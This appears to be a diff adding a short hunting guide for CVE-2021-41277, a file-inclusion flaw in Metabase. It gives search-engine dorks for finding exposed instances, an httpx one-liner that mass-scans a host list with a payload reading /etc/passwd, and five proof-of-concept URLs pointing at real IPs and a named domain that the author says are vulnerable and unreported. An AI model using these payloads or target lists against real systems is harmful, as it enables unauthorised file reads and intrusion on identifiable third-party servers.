@@ -1,0 +1,22 @@
+CVE-2021-41277 (LFI)
+
+about cve:
+Metabase custom geojson map file inclusion 
+how to hunt?
+
+ shodan dork : http.title:"Metabase"
+google dorks : "Sign in to Metabase" (or) inurl:/auth/login?redirect=%2F (or) inurl:/auth/login?redirect=%2F intext:Sign in to Metabase
+censys dork : ("Metabase")
+
+if you having subdomains list run this oneliner to find vulnerable domain to this vulnerability
+
+httpx -l iplist.txt -follow-redirects -title -path /api/geojson?url=file:///etc/password -match-string
+
+
+few POCS find by me but not reported as they dont have bb or VDp
+
+-->http://141.94.78.102/api/geojson?url=file:///etc/passwd
+-->https://34.241.114.68/api/geojson?url=file:///etc/passwd
+-->http://1.14.92.201:3000/api/geojson?url=file:///etc/passwd
+-->http://3.6.12.72/api/geojson?url=file:///etc/passwd
+-->https://metabase.echl.ltd/api/geojson?url=file:///etc/passwd
